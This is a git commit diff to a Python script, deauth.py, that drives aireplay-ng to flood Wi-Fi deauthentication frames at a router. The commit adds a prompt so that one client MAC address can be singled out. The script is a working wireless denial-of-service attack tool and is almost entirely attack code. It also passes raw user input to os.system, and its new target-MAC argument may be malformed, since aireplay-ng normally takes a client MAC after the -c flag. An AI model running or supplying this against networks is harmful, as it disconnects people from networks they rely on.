a97b197009c8e505ae351116af0461ba5a1a428a
sudoaptinstalllevi <fcloudservice@gmail.com>
2025-06-25 00:08:10 +1000

    Update deauth.py

--- deauth.py
+++ deauth.py
@@ -6,7 +6,8 @@ ent_ch = input("enter your network channel: ")
 os.system(f"sudo iwconfig {interface} channel {ent_ch}")
 try: 
   ap = input("enter the bssid/mac_address of the router: ")
-  os.system(f"sudo aireplay-ng -0 0 -a {ap} {interface}")
+  target_mac = input("enter the target mac of that ap: ")
+  os.system(f"sudo aireplay-ng -0 0 -a {ap} {interface} {target_mac}")
 except KeyboardInterrupt:
   print("exited")
 
